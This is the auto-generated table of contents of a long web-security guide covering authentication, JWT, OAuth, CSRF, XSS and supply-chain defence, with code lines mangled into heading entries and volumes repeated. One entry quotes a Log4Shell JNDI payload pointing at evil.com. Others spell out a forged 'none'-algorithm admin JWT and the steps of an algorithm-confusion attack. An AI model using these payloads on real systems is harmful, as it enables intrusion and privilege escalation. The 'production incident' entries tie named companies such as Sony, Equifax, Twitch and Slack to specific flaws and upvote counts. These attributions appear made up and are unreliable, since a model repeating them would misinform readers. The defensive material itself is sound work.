- [Hashing Algorithm Choice 2](#hashing-algorithm-choice-2)
- [Implementation 3](#implementation-3)
- [Password Policy 2](#password-policy-2)
- [API AUTHENTICATION PATTERNS 2](#api-authentication-patterns-2)
- [API Key vs JWT vs OAuth 2](#api-key-vs-jwt-vs-oauth-2)
- [API Key Best Practices 2](#api-key-best-practices-2)
- [JWT for APIs 2](#jwt-for-apis-2)
- [Scope-Based Authorization 2](#scope-based-authorization-2)
- [RBAC IMPLEMENTATION 2](#rbac-implementation-2)
- [Database Schema 2](#database-schema-2)
- [Permission Check 2](#permission-check-2)
- [Middleware 2](#middleware-2)
- [MFA IMPLEMENTATION 2](#mfa-implementation-2)
- [TOTP (Time-based One-Time Password) 2](#totp-time-based-one-time-password-2)
- [Backup Codes 2](#backup-codes-2)
- [Recovery Flow 2](#recovery-flow-2)
- [SECURITY SCANNING 2](#security-scanning-2)
- [Static Analysis 2](#static-analysis-2)
- [ESLint security plugin 2](#eslint-security-plugin-2)
- [.eslintrc.js 2](#eslintrcjs-2)
- [Dependency Scanning 3](#dependency-scanning-3)
- [npm audit 3](#npm-audit-3)
- [Snyk 2](#snyk-2)
- [OWASP Dependency Check 2](#owasp-dependency-check-2)
- [Container Scanning 2](#container-scanning-2)
- [GitHub Actions with Trivy 2](#github-actions-with-trivy-2)
- [SAST in CI 2](#sast-in-ci-2)
- [GitHub Actions 2](#github-actions-2)
- [Block PR if quality gate fails 2](#block-pr-if-quality-gate-fails-2)
- [ACCOUNT SECURITY PATTERNS 2](#account-security-patterns-2)
- [Login Attempt Tracking 2](#login-attempt-tracking-2)
- [Suspicious Activity Detection 2](#suspicious-activity-detection-2)
- [Session Security 3](#session-security-3)
- [OAUTH 2.0 DEEP DIVE 2](#oauth-20-deep-dive-2)
- [PKCE Flow (for SPAs and Mobile) 2](#pkce-flow-for-spas-and-mobile-2)
- [Token Storage 3](#token-storage-3)
- [Silent Refresh 2](#silent-refresh-2)
- [JWT SECURITY PATTERNS 2](#jwt-security-patterns-2)
- [Token Structure 3](#token-structure-3)
- [Access + Refresh Tokens 2](#access--refresh-tokens-2)
- [Security Checklist 2](#security-checklist-2)
- [AUTHENTICATION FLOW PATTERNS 2](#authentication-flow-patterns-2)
- [OAuth 2.0 with PKCE (SPA/Mobile) 2](#oauth-20-with-pkce-spamobile-2)
- [Session vs Token Comparison 2](#session-vs-token-comparison-2)
- [XSS PREVENTION 2](#xss-prevention-2)
- [Types of XSS 2](#types-of-xss-2)
- [Prevention (React) 2](#prevention-react-2)
- [Prevention (Backend) 2](#prevention-backend-2)
- [ENVIRONMENT VARIABLES 3](#environment-variables-3)
- [Environment Setup 2](#environment-setup-2)
- [.env.local (local dev, gitignored) 2](#envlocal-local-dev-gitignored-2)
- [.env (defaults, committed) 2](#env-defaults-committed-2)
- [.env.production (production values) 2](#envproduction-production-values-2)
- [Validation with Zod 2](#validation-with-zod-2)
- [Security Rules 3](#security-rules-3)
- [CSRF PROTECTION 4](#csrf-protection-4)
- [What is CSRF? 2](#what-is-csrf-2)
- [Prevention: Token Pattern 2](#prevention-token-pattern-2)
- [For SPAs: Double Submit Cookie 2](#for-spas-double-submit-cookie-2)
- [COOKIE SECURITY 4](#cookie-security-4)
- [Secure Cookie Settings 2](#secure-cookie-settings-2)
- [SameSite Explained 2](#samesite-explained-2)
- [Cookie vs localStorage 2](#cookie-vs-localstorage-2)
- [PATTERNS 2](#patterns-2)
- [Setup 2](#setup-2)
- [Route Protection 2](#route-protection-2)
- [Server Component 2](#server-component-2)
- [Client Component 2](#client-component-2)
- [VOLUME 7: SECURITY PRODUCTION INCIDENTS (Real Company Stories) 2](#volume-7-security-production-incidents-real-company-stories-2)
- [1. SQL INJECTION - DATA BREACH 2](#1-sql-injection---data-breach-2)
  - [Production Incident from Sony (18,500+ upvotes) 2](#production-incident-from-sony-18500-upvotes-2)
- [TERRIBLE - SQL Injection 2](#terrible---sql-injection-2)
- [Attacker: email = "admin'--" 2](#attacker-email--admin---2)
- [Query: SELECT* FROM users WHERE email = 'admin'--' 2](#query-select-from-users-where-email--admin---2)
- [Password check bypassed! 2](#password-check-bypassed-2)
- [EXCELLENT - Parameterized 2](#excellent---parameterized-2)
- [2. PASSWORD BREACH - $1.4 BILLION 2](#2-password-breach---14-billion-2)
- [Production Incident from Equifax (LEGENDARY) 2](#production-incident-from-equifax-legendary-2)
- [DISASTER - Plain text 2](#disaster---plain-text-2)
- [EXCELLENT - bcrypt 2](#excellent---bcrypt-2)
- [3. JWT SECRET EXPOSED 2](#3-jwt-secret-exposed-2)
- [Production Incident from Twitch (9,800+ upvotes) 2](#production-incident-from-twitch-9800-upvotes-2)
- [4. LOG4SHELL - WORST EVER (10/10) 2](#4-log4shell---worst-ever-1010-2)
  - [Production Incident from Worldwide 2](#production-incident-from-worldwide-2)
- [Attack: Send header containing ${jndi:ldap://evil.com/exploit} 2](#attack-send-header-containing-jndildapevilcomexploit-2)
- [Log4j downloads and executes attacker's code! 2](#log4j-downloads-and-executes-attackers-code-2)
- [FIX: Update to Log4j 2.17.0+ 2](#fix-update-to-log4j-2170-2)
- [TEMP: -Dlog4j2.formatMsgNoLookups=true 2](#temp--dlog4j2formatmsgnolookupstrue-2)
- [5. API KEY LEAKED - $50K BILL 2](#5-api-key-leaked---50k-bill-2)
- [Production Incident from Heroku (7,400+ upvotes) 2](#production-incident-from-heroku-7400-upvotes-2)
- [FIX: Enable GitHub Secret Scanning 2](#fix-enable-github-secret-scanning-2)
- [Settings Security Secret scanning Enable 2](#settings-security-secret-scanning-enable-2)
- [Pre-commit hook 2](#pre-commit-hook-2)
- [6. SSRF - INTERNAL ACCESS 2](#6-ssrf---internal-access-2)
- [Production Incident from Slack (8,200+ upvotes) 2](#production-incident-from-slack-8200-upvotes-2)
- [TERRIBLE - Fetches any URL 2](#terrible---fetches-any-url-2)
- [EXCELLENT - Block internal IPs 2](#excellent---block-internal-ips-2)
- [END OF VOLUME 7: SECURITY PRODUCTION INCIDENTS 2](#end-of-volume-7-security-production-incidents-2)
- [VOLUME 1.1: TITAN PROTOCOL - SECURITY ADVERSARIAL 2](#volume-11-titan-protocol---security-adversarial-2)
- [JWT NONE ALGORITHM VULNERABILITY 2](#jwt-none-algorithm-vulnerability-2)
  - [Auth Bypass Scar 2](#auth-bypass-scar-2)
- [ReDoS (REGEX DENIAL OF SERVICE) 2](#redos-regex-denial-of-service-2)
  - [Event Loop Freeze Scar 2](#event-loop-freeze-scar-2)
  - [END OF VOLUME 1.1: TITAN SECURITY ADVERSARIAL 2](#end-of-volume-11-titan-security-adversarial-2)
- [VOLUME 1.2: TITAN PROTOCOL - ADVERSARIAL ARCHITECTURE 2](#volume-12-titan-protocol---adversarial-architecture-2)
- [CONTAINER ESCAPES: LEAKY VESSELS (CVE-2024-21626) 2](#container-escapes-leaky-vessels-cve-2024-21626-2)
  - [runc Vulnerability Scar 2](#runc-vulnerability-scar-2)
- [eBPF EXPLOITATION 2](#ebpf-exploitation-2)
  - [Kernel Attack Surface Scar 2](#kernel-attack-surface-scar-2)
- [SIDE-CHANNEL ATTACKS: TIMING IN CRYPTOGRAPHY 2](#side-channel-attacks-timing-in-cryptography-2)
  - [String Comparison Timing Attack 2](#string-comparison-timing-attack-2)
- [HOMOMORPHIC ENCRYPTION: THE HOLY GRAIL 2](#homomorphic-encryption-the-holy-grail-2)
  - [FHE Status 2024 2](#fhe-status-2024-2)
  - [END OF VOLUME 1.2: TITAN ADVERSARIAL SECURITY 2](#end-of-volume-12-titan-adversarial-security-2)
- [VOLUME 1.3: TITAN CATALOG - 30 SECURITY FAILURES 2](#volume-13-titan-catalog---30-security-failures-2)
- [END OF VOLUME 1.3: TITAN SECURITY CATALOG 2](#end-of-volume-13-titan-security-catalog-2)
- [VOLUME 1.4: TITAN VAULT - ADDITIONAL SECURITY SCARS 2](#volume-14-titan-vault---additional-security-scars-2)
- [IAM PASSROLE PRIVILEGE ESCALATION 2](#iam-passrole-privilege-escalation-2)
  - [AWS Privilege Escalation Scar 2](#aws-privilege-escalation-scar-2)
- [S3 NOTPRINCIPAL ANTI-PATTERN 2](#s3-notprincipal-anti-pattern-2)
  - [Data Exfiltration Vector 2](#data-exfiltration-vector-2)
  - [END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS 2](#end-of-volume-14-additional-security-scars-2)
- [VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS](#volume-15-titan-vault---supply-chain--identity-attacks)
- [JWT ALGORITHM CONFUSION ATTACK](#jwt-algorithm-confusion-attack)
  - [RS256 to HS256 Downgrade Scar](#rs256-to-hs256-downgrade-scar)
- [TITAN: Strict Algorithm Enforcement](#titan-strict-algorithm-enforcement)
- [CRITICAL: algorithms parameter is a WHITELIST](#critical-algorithms-parameter-is-a-whitelist)
- [Additional JWT Pitfalls](#additional-jwt-pitfalls)
- [OPENID CONNECT VULNERABILITIES](#openid-connect-vulnerabilities)
  - [OIDC State Fixation Scar](#oidc-state-fixation-scar)
- [DEPENDENCY CONFUSION ATTACK](#dependency-confusion-attack)
  - [Private Package Hijacking Scar](#private-package-hijacking-scar)
- [TITAN: npm Registry Scoping](#titan-npm-registry-scoping)
- [.npmrc - Force scoped packages to private registry](#npmrc---force-scoped-packages-to-private-registry)
- [For all internal packages, use scope](#for-all-internal-packages-use-scope)
- [@mycompany/analytics-internal (cannot be confused)](#mycompanyanalytics-internal-cannot-be-confused)
- [TITAN: Python pip.conf for private packages](#titan-python-pipconf-for-private-packages)
- [pip.conf](#pipconf)
- [CRITICAL: Prefer private index](#critical-prefer-private-index)
- [Private packages should use unique naming](#private-packages-should-use-unique-naming)
- [E.g., mycompany-analytics, mycompany-utils](#eg-mycompany-analytics-mycompany-utils)
- [Detection 2](#detection-2)
- [Audit for public packages matching internal names](#audit-for-public-packages-matching-internal-names)
- [CERTIFICATE CHAIN VALIDATION FAILURES](#certificate-chain-validation-failures)
- [Incomplete Chain Scar](#incomplete-chain-scar)
- [TITAN: Full Chain Validation](#titan-full-chain-validation)
- [Get full chain](#get-full-chain)
- [Verify each cert signs the next](#verify-each-cert-signs-the-next)
- [Verify issuer matches](#verify-issuer-matches)
- [CONSTANT-TIME STRING COMPARISON](#constant-time-string-comparison)
- [Timing Attack Exploitation](#timing-attack-exploitation)
- [TITAN: Constant-Time Comparison](#titan-constant-time-comparison)
- [Method 1: Double HMAC (paranoid)](#method-1-double-hmac-paranoid)
- [Random key prevents length-extension attacks](#random-key-prevents-length-extension-attacks)
- [Hash the provided key first (prevents length leakage)](#hash-the-provided-key-first-prevents-length-leakage)
- [Constant-time comparison of hashes](#constant-time-comparison-of-hashes)
- [END OF VOLUME 1.5: TITAN SUPPLY CHAIN & IDENTITY ATTACKS](#end-of-volume-15-titan-supply-chain--identity-attacks)
- [VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS](#volume-16-titan-deep-internals---application-security-mechanics)
- [OAUTH 2.0: PKCE MANDATORY](#oauth-20-pkce-mandatory)
  - [Authorization Code Interception](#authorization-code-interception)
- [TITAN: PKCE Implementation](#titan-pkce-implementation)
- [43-128 chars, cryptographically random](#43-128-chars-cryptographically-random)
- [S256: SHA256 hash of verifier, base64url encoded](#s256-sha256-hash-of-verifier-base64url-encoded)
- [Include verifier in token request](#include-verifier-in-token-request)
- [SSRF BYPASS TECHNIQUES](#ssrf-bypass-techniques)
- [IP Address Bypass Scar](#ip-address-bypass-scar)
- [TITAN: Comprehensive SSRF Protection](#titan-comprehensive-ssrf-protection)
- [Block file:// and other dangerous schemes](#block-file-and-other-dangerous-schemes)
- [Resolve BEFORE making request (prevents DNS rebinding)](#resolve-before-making-request-prevents-dns-rebinding)
- [Check against blocklist](#check-against-blocklist)
- [Cache DNS result to prevent rebinding between check and use](#cache-dns-result-to-prevent-rebinding-between-check-and-use)
- [Use cached IP to prevent DNS rebinding](#use-cached-ip-to-prevent-dns-rebinding)
- [DESERIALIZATION ATTACKS](#deserialization-attacks)
- [Object Injection Deep Dive](#object-injection-deep-dive)
- [VIBE: Arbitrary code execution](#vibe-arbitrary-code-execution)
- [VIBE: YAML load is unsafe](#vibe-yaml-load-is-unsafe)
- [TITAN: Safe alternatives](#titan-safe-alternatives)
- [JSON is safe (no code execution)](#json-is-safe-no-code-execution)
- [If schema needed, use explicit parsing](#if-schema-needed-use-explicit-parsing)
- [If you MUST deserialize complex objects](#if-you-must-deserialize-complex-objects)
- [Plus: Whitelist of allowed classes](#plus-whitelist-of-allowed-classes)
- [TITAN: Safe YAML](#titan-safe-yaml)
- [Always use safe_load](#always-use-safeload)
- [For custom objects, be explicit](#for-custom-objects-be-explicit)
- [Only allow specific types](#only-allow-specific-types)
- [CSP BYPASS TECHNIQUES](#csp-bypass-techniques)
- [Content Security Policy Evasion](#content-security-policy-evasion)
- [TITAN: Server-side nonce generation](#titan-server-side-nonce-generation)
- [RACE CONDITION VULNERABILITIES](#race-condition-vulnerabilities)
- [Time-of-Check to Time-of-Use (TOCTOU)](#time-of-check-to-time-of-use-toctou)
- [VIBE: Race condition vulnerable](#vibe-race-condition-vulnerable)
- [Check](#check)
- [Time](#time)
- [TITAN: Atomic operation with row locking](#titan-atomic-operation-with-row-locking)
- [SELECT FOR UPDATE locks the row](#select-for-update-locks-the-row)
- [TITAN: Optimistic locking with version](#titan-optimistic-locking-with-version)
- [END OF VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS](#end-of-volume-16-titan-deep-internals---application-security-mechanics)
- [VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS](#volume-17-titan-gemini-research---advanced-attack-patterns)
- [JWT NONE ALGORITHM ATTACK](#jwt-none-algorithm-attack)
  - [The Scar](#the-scar)
- [VIBE: Accepts any algorithm](#vibe-accepts-any-algorithm)
- [VULNERABLE: algorithms not specified](#vulnerable-algorithms-not-specified)
- [Attacker creates](#attacker-creates)
- [Header: {"alg": "none", "typ": "JWT"}](#header-alg-none-typ-jwt)
- [Payload: {"sub": "admin", "role": "superuser"}](#payload-sub-admin-role-superuser)
- [Signature: (empty)](#signature-empty)
- [Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ](#token-eyjhbgcioijub25liiwidhlwijoislduin0eyjzdwiioijhzg1pbiisinjvbguioijzdxblcnvzzxiifq)
- [TITAN: Explicit algorithm whitelist](#titan-explicit-algorithm-whitelist)
- [TITAN: Prevent algorithm confusion (RS256 vs HS256)](#titan-prevent-algorithm-confusion-rs256-vs-hs256)
- [If using RS256 (asymmetric), attacker might](#if-using-rs256-asymmetric-attacker-might)
- [1. Get public key (often exposed)](#1-get-public-key-often-exposed)
- [2. Sign token with HS256 using public key as secret](#2-sign-token-with-hs256-using-public-key-as-secret)
- [3. Server verifies with same "secret" = valid signature](#3-server-verifies-with-same-secret--valid-signature)
- [Defense: NEVER use same key handling for both](#defense-never-use-same-key-handling-for-both)
- [Use correct key based on algorithm](#use-correct-key-based-on-algorithm)
- [TIMING ATTACKS AGAINST STRING COMPARISON](#timing-attacks-against-string-comparison)
- [The Scar 2](#the-scar-2)
- [VIBE: Timing-vulnerable comparison](#vibe-timing-vulnerable-comparison)
- [First character mismatch: ~100ns](#first-character-mismatch-100ns)
- [Last character mismatch: ~1000ns](#last-character-mismatch-1000ns)
- [Attacker can detect the difference](#attacker-can-detect-the-difference)
- [VIBE: Early return on mismatch](#vibe-early-return-on-mismatch)
- [TITAN: Constant-time comparison 2](#titan-constant-time-comparison-2)
- [hmac.compare_digest is constant-time](#hmaccomparedigest-is-constant-time)
- [Takes same time regardless of where mismatch occurs](#takes-same-time-regardless-of-where-mismatch-occurs)
- [TITAN: For hashed passwords, use dedicated library](#titan-for-hashed-passwords-use-dedicated-library)
- [argon2.verify is constant-time internally](#argon2verify-is-constant-time-internally)
- [TITAN: Node.js constant-time comparison](#titan-nodejs-constant-time-comparison)
- [const crypto = require('crypto');](#const-crypto--requirecrypto)
- [function verifyApiKey(provided, stored) {](#function-verifyapikeyprovided-stored-)
- [// crypto.timingSafeEqual is constant-time](#-cryptotimingsafeequal-is-constant-time)
- [const a = Buffer.from(provided);](#const-a--bufferfromprovided)
- [const b = Buffer.from(stored);](#const-b--bufferfromstored)
- [2](#2-1)
- [if (a.length !== b.length) {](#if-alength--blength-)
- [// Still compare to prevent length oracle](#-still-compare-to-prevent-length-oracle)
- [return crypto.timingSafeEqual(a, a) && false;](#return-cryptotimingsafeequala-a--false)
- [}](#)
- [3](#3)
- [return crypto.timingSafeEqual(a, b);](#return-cryptotimingsafeequala-b)
- [} 2 2](#-2-2)
- [REDOS - REGEX DENIAL OF SERVICE](#redos---regex-denial-of-service)
- [The Scar 2 2](#the-scar-2-2)
- [VIBE: Catastrophic backtracking patterns](#vibe-catastrophic-backtracking-patterns)
- [These regexes have exponential backtracking](#these-regexes-have-exponential-backtracking)
- [With input: 'a' *30 + '!'](#with-input-a-30--)
- [Takes MINUTES to return False](#takes-minutes-to-return-false)
- [TITAN: Safe regex patterns](#titan-safe-regex-patterns)
- [Use possessive quantifiers or atomic groups (not in Python re)](#use-possessive-quantifiers-or-atomic-groups-not-in-python-re)
- [Or rewrite to avoid nested quantifiers](#or-rewrite-to-avoid-nested-quantifiers)
- [Safe email validation (no nested quantifiers)](#safe-email-validation-no-nested-quantifiers)
- [TITAN: Use regex with timeouts](#titan-use-regex-with-timeouts)
- [TITAN: Use linear-time regex engine](#titan-use-linear-time-regex-engine)
- [RE2 uses finite automata, no backtracking](#re2-uses-finite-automata-no-backtracking)
- [Guaranteed O(n) time complexity](#guaranteed-on-time-complexity)
- [TITAN: Pre-validate input length](#titan-pre-validate-input-length)
- [UNICODE NORMALIZATION ATTACKS](#unicode-normalization-attacks)
- [The Scar 3](#the-scar-3)
- [VIBE: Filter before normalization](#vibe-filter-before-normalization)
- [Save to database (which normalizes Unicode)](#save-to-database-which-normalizes-unicode)
- [Attacker passes: (circled letters)](#attacker-passes-circled-letters)
- [Filter passes. Database normalizes to 'admin'](#filter-passes-database-normalizes-to-admin)
- [TITAN: Normalize BEFORE checking](#titan-normalize-before-checking)
- [Normalize to NFKC (compatibility composition)](#normalize-to-nfkc-compatibility-composition)
- [Converts l, a, III, etc](#converts-l-a-iii-etc)
- [Remove zero-width characters (invisible)](#remove-zero-width-characters-invisible)
- [U+200B (zero-width space), U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM)](#u200b-zero-width-space-u200c-zwnj-u200d-zwj-ufeff-bom)
- [Now check against reserved names](#now-check-against-reserved-names)
- [TITAN: Confusable character detection](#titan-confusable-character-detection)
- [Detect visually similar characters](#detect-visually-similar-characters)
- [(Cyrillic vs 'paypal.com' (Latin 'a')](#cyrillic-vs-paypalcom-latin-a)
- [TITAN: Locale-aware case conversion (Turkish problem)](#titan-locale-aware-case-conversion-turkish-problem)
- [Turkish: 'I'.lower() should be (dotless i), not 'i'](#turkish-ilower-should-be-dotless-i-not-i)
- [Don't use .lower() for security comparisons](#dont-use-lower-for-security-comparisons)
- [BUFFER OVERFLOW PREVENTION PATTERNS](#buffer-overflow-prevention-patterns)
- [The Scar 4](#the-scar-4)
- [include <string.h>](#include-stringh)
- [END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS](#end-of-volume-17-titan-gemini-research---advanced-attack-patterns)
- [VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION](#volume-2-titan-gemini-research---auth-and-secrets-production)
- [JWT SECURITY PITFALLS](#jwt-security-pitfalls)
  - [The Scar 3 2](#the-scar-3-2)
- [SECRETS MANAGEMENT WITH VAULT](#secrets-management-with-vault)
  - [The Scar 4 2](#the-scar-4-2)
- [VIBE: Hardcoded secrets](#vibe-hardcoded-secrets)
- [Or slightly better but still dangerous](#or-slightly-better-but-still-dangerous)
- [TITAN: HashiCorp Vault integration](#titan-hashicorp-vault-integration)
- [Authenticate based on environment](#authenticate-based-on-environment)
- [Read service account token](#read-service-account-token)
- [IAM authentication](#iam-authentication)
- [For CI/CD](#for-cicd)
- [Check cache](#check-cache)
- [Fetch from Vault](#fetch-from-vault)
- [Cache with lease](#cache-with-lease)
- [Log for audit](#log-for-audit)
- [1. Generate new key](#1-generate-new-key)
- [2. Read current key](#2-read-current-key)
- [3. Update Vault with both keys active](#3-update-vault-with-both-keys-active)
- [Usage](#usage)
- [Get static secret](#get-static-secret)
- [Get dynamic database credentials](#get-dynamic-database-credentials)
- [API KEY ROTATION](#api-key-rotation)
- [The Scar 5](#the-scar-5)
- [VIBE: Static API keys](#vibe-static-api-keys)
- [TITAN: Rotating API keys with audit trail](#titan-rotating-api-keys-with-audit-trail)
- [Generate key components](#generate-key-components)
- [Store in database (NEVER store the secret!)](#store-in-database-never-store-the-secret)
- [Audit log](#audit-log)
- [Return full key (only time it's visible)](#return-full-key-only-time-its-visible)
- [Check cache first](#check-cache-first)
- [Fetch from database](#fetch-from-database)
- [Cache for 5 minutes](#cache-for-5-minutes)
- [Verify hash](#verify-hash)
- [Check expiration](#check-expiration)
- [Check if revoked](#check-if-revoked)
- [Update last used (async, don't block request)](#update-last-used-async-dont-block-request)
- [Create new key](#create-new-key)
- [Mark old key for deprecation (still valid for 24 hours)](#mark-old-key-for-deprecation-still-valid-for-24-hours)
- [Invalidate cache](#invalidate-cache)
- [END OF VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION](#end-of-volume-2-titan-gemini-research---auth-and-secrets-production)
- [VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY](#volume-3-titan-gemini-research---supply-chain-security)
- [DEPENDENCY VULNERABILITY DISASTERS](#dependency-vulnerability-disasters)
  - [The Scar 5 2](#the-scar-5-2)
- [VIBE: No dependency scanning](#vibe-no-dependency-scanning)
- [Just run npm install and hope nothing bad happens](#just-run-npm-install-and-hope-nothing-bad-happens)
- [TITAN: GitHub Actions with dependency scanning and SBOM](#titan-github-actions-with-dependency-scanning-and-sbom)
- [Generate SBOM (Software Bill of Materials)](#generate-sbom-software-bill-of-materials)
- [Scan for vulnerabilities](#scan-for-vulnerabilities)
- [Check for known malicious packages](#check-for-known-malicious-packages)
- [Upload SBOM as artifact](#upload-sbom-as-artifact)
- [Attest SBOM for provenance](#attest-sbom-for-provenance)
- [Scan container image](#scan-container-image)
- [Upload scan results](#upload-scan-results)
- [TITAN: Continuous dependency monitoring](#titan-continuous-dependency-monitoring)
- [Find all package.json files](#find-all-packagejson-files)
- [Run npm audit](#run-npm-audit)
- [Deduplicate](#deduplicate)
- [CONTAINER IMAGE SIGNING](#container-image-signing)
- [The Scar 6](#the-scar-6)
- [VIBE: Pull any image, trust registry](#vibe-pull-any-image-trust-registry)
- [TITAN: Cosign image signing and verification](#titan-cosign-image-signing-and-verification)
- [Sign with keyless signing (Sigstore)](#sign-with-keyless-signing-sigstore)
- [Attest SBOM](#attest-sbom)
- [TITAN: Kubernetes admission controller for signature verification](#titan-kubernetes-admission-controller-for-signature-verification)
- [Kyverno policy](#kyverno-policy)
- [END OF VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY](#end-of-volume-3-titan-gemini-research---supply-chain-security)
- [VOLUME 5: ADVANCED SECURITY PATTERNS](#volume-5-advanced-security-patterns)
- [OWASP TOP 10 PROTECTION](#owasp-top-10-protection)
  - [SQL Injection Prevention](#sql-injection-prevention)
  - [XSS Prevention 2 2](#xss-prevention-2-2)
- [AUTHENTICATION HARDENING](#authentication-hardening)
  - [Secure Password Handling](#secure-password-handling)
- [RATE LIMITING & BRUTE FORCE PROTECTION](#rate-limiting--brute-force-protection)
  - [Account Lockout Pattern](#account-lockout-pattern)
- [SECRET MANAGEMENT](#secret-management)
  - [HashiCorp Vault Integration](#hashicorp-vault-integration)
  - [END OF SECURITY VOLUME 5](#end-of-security-volume-5)
  - [Lines: ~400+ added](#lines-400-added)
- [VOLUME 6: REAL 2024 NEXTAUTH.JS PRODUCTION ISSUES](#volume-6-real-2024-nextauthjs-production-issues)
- [Source: Stack Overflow, GitHub Issues, Developer Reports](#source-stack-overflow-github-issues-developer-reports)
- [SESSION NOT PERSISTING](#session-not-persisting)
  - [The Error](#the-error)
  - [Real Causes and Fixes](#real-causes-and-fixes)
  - [Cause 1: Missing NEXTAUTH_SECRET in Production](#cause-1-missing-nextauthsecret-in-production)
  - [Cause 2: Missing NEXTAUTH_URL in Production](#cause-2-missing-nextauthurl-in-production)
  - [Cause 3: Credentials Provider + Database Adapter Conflict](#cause-3-credentials-provider--database-adapter-conflict)
  - [Cause 4: useSession Not Updating After Login](#cause-4-usesession-not-updating-after-login)
- [CALLBACK ERRORS](#callback-errors)
  - [OAuth Callback URL Mismatch](#oauth-callback-url-mismatch)
  - [Fix](#fix)
  - [File Name Case Sensitivity](#file-name-case-sensitivity)
  - [Fix 2](#fix-2)
- [WRONG: [...nextAuth].ts (capital A)](#wrong-nextauthts-capital-a)
- [CORRECT: [...nextauth].ts (lowercase)](#correct-nextauthts-lowercase)
- [Git might not track case-only changes](#git-might-not-track-case-only-changes)
- [Force rename](#force-rename)
- [CALLBACK CONFIGURATION FOR CUSTOM DATA](#callback-configuration-for-custom-data)
- [DECISION TREE: NEXTAUTH TROUBLESHOOTING](#decision-tree-nextauth-troubleshooting)
- [PRODUCTION CHECKLIST](#production-checklist)
  - [END OF NEXTAUTH.JS REAL PRODUCTION ISSUES](#end-of-nextauthjs-real-production-issues)
- [VOLUME 7: REAL 2024 JWT SECURITY PATTERNS](#volume-7-real-2024-jwt-security-patterns)
- [Source: Security Research, CVEs, Production Experience](#source-security-research-cves-production-experience)
- [JWT VULNERABILITIES](#jwt-vulnerabilities)
  - [Algorithm Confusion Attack (Most Common)](#algorithm-confusion-attack-most-common)
  - [Real Fix: Whitelist Algorithms](#real-fix-whitelist-algorithms)
  - ["none" Algorithm Attack](#none-algorithm-attack)
  - [Real Fix](#real-fix)
- [REFRESH TOKEN ROTATION](#refresh-token-rotation)
  - [The Problem](#the-problem)
  - [Real Fix: Rotate on Every Use](#real-fix-rotate-on-every-use)
- [SECURE TOKEN STORAGE](#secure-token-storage)
- [TOKEN LIFETIME BEST PRACTICES](#token-lifetime-best-practices)
- [LOGOUT PROPERLY](#logout-properly)
- [DECISION TREE: JWT DEBUGGING](#decision-tree-jwt-debugging)
- [JWT SECURITY CHECKLIST](#jwt-security-checklist)
  - [END OF JWT REAL SECURITY PATTERNS](#end-of-jwt-real-security-patterns)
- [VOLUME 8: REAL OWASP SECURITY PATTERNS 2024](#volume-8-real-owasp-security-patterns-2024)
- [Source: OWASP Top 10, Production Experience, Security Research](#source-owasp-top-10-production-experience-security-research)
- [SQL INJECTION PREVENTION 2](#sql-injection-prevention-2)
- [XSS PREVENTION 3](#xss-prevention-3)
- [CSRF PREVENTION](#csrf-prevention)
- [SECURE HEADERS](#secure-headers)
- [INPUT VALIDATION 6](#input-validation-6)
- [DECISION TREE: SECURITY AUDIT](#decision-tree-security-audit)
  - [END OF OWASP SECURITY PATTERNS](#end-of-owasp-security-patterns)
- [REAL INPUT VALIDATION PATTERNS 2024](#real-input-validation-patterns-2024)
- [SQL Injection Prevention 2 2](#sql-injection-prevention-2-2)
- [XSS Prevention 4](#xss-prevention-4)
- [CSRF Protection 5](#csrf-protection-5)
- [Password Hashing 2](#password-hashing-2)
- [API Key Security](#api-key-security)
  - [END OF SECURITY PATTERNS](#end-of-security-patterns)
- [VOLUME 6: DATABASE PRODUCTION FAILURES](#volume-6-database-production-failures)
- [VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS 2](#volume-15-titan-vault---supply-chain--identity-attacks-2)
- [JWT ALGORITHM CONFUSION ATTACK 2](#jwt-algorithm-confusion-attack-2)
  - [RS256 to HS256 Downgrade Scar 2](#rs256-to-hs256-downgrade-scar-2)
- [TITAN: Strict Algorithm Enforcement 2](#titan-strict-algorithm-enforcement-2)
- [CRITICAL: algorithms parameter is a WHITELIST 2](#critical-algorithms-parameter-is-a-whitelist-2)
- [Additional JWT Pitfalls 2](#additional-jwt-pitfalls-2)
- [OPENID CONNECT VULNERABILITIES 2](#openid-connect-vulnerabilities-2)
  - [OIDC State Fixation Scar 2](#oidc-state-fixation-scar-2)
- [DEPENDENCY CONFUSION ATTACK 2](#dependency-confusion-attack-2)
  - [Private Package Hijacking Scar 2](#private-package-hijacking-scar-2)
- [TITAN: npm Registry Scoping 2](#titan-npm-registry-scoping-2)
- [.npmrc - Force scoped packages to private registry 2](#npmrc---force-scoped-packages-to-private-registry-2)
- [For all internal packages, use scope 2](#for-all-internal-packages-use-scope-2)
- [@mycompany/analytics-internal (cannot be confused) 2](#mycompanyanalytics-internal-cannot-be-confused-2)
- [TITAN: Python pip.conf for private packages 2](#titan-python-pipconf-for-private-packages-2)
- [pip.conf 2](#pipconf-2)
- [CRITICAL: Prefer private index 2](#critical-prefer-private-index-2)
- [Private packages should use unique naming 2](#private-packages-should-use-unique-naming-2)
- [E.g., mycompany-analytics, mycompany-utils 2](#eg-mycompany-analytics-mycompany-utils-2)
- [Detection 3](#detection-3)
- [Audit for public packages matching internal names 2](#audit-for-public-packages-matching-internal-names-2)
- [CERTIFICATE CHAIN VALIDATION FAILURES 2](#certificate-chain-validation-failures-2)
- [Incomplete Chain Scar 2](#incomplete-chain-scar-2)
- [TITAN: Full Chain Validation 2](#titan-full-chain-validation-2)
- [Get full chain 2](#get-full-chain-2)
- [Verify each cert signs the next 2](#verify-each-cert-signs-the-next-2)
- [Verify issuer matches 2](#verify-issuer-matches-2)
